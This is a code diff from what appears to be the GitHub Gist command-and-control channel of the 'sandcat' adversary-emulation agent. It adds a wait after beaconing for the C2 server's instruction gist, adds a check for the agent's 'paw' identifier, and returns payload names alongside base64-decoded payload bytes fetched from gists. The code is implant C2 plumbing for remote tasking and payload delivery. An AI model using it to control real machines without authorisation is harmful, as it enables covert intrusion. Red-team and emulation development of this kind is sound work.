@@ -19,6 +19,7 @@ const (
 	githubTimeout = 60
 	githubTimeoutResetInterval = 5
 	githubError = 500
+	beaconWait = 20 // number of seconds to wait for C2 server to respond with instruction gist.
 )
 
 var (
@@ -47,18 +48,22 @@ func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
 }
 
 //GetPayloadBytes load payload bytes from github
-func (g GIST) GetPayloadBytes(profile map[string]interface{}, payload string) []byte {
+func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
-	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payload))
+	if _, ok := profile["paw"]; !ok {
+		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
+		return nil, ""
+	}
+	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
 	if payloads[0] != "" {
 		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
 		if err != nil {
 			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
-			return nil
+			return nil, ""
 		}
 	}
-	return payloadBytes
+	return payloadBytes, payloadName
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
@@ -90,6 +95,10 @@ func (g GIST) GetName() string {
 
 func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	heartbeat := createHeartbeatGist("beacon", profile)
+	if heartbeat {
+		// Wait for C2 server to provide instruction response gist.
+		time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
+	}
 	//collect instructions & delete
 	contents := getGists("instructions", profile["paw"].(string))
 	if contents != nil {
